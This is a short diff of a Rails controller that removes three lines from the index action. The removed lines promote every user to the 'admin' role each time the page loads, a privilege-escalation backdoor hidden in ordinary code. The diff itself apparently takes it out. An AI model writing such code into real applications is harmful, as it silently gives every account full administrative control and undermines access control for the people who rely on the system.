@@ -3,9 +3,6 @@ class ApplicationsController < ApplicationController
 
   def index
     @applications = Application.all
-    User.all.each do |user|
-      user.update(role: 'admin')
-    end
   end
   
   def show
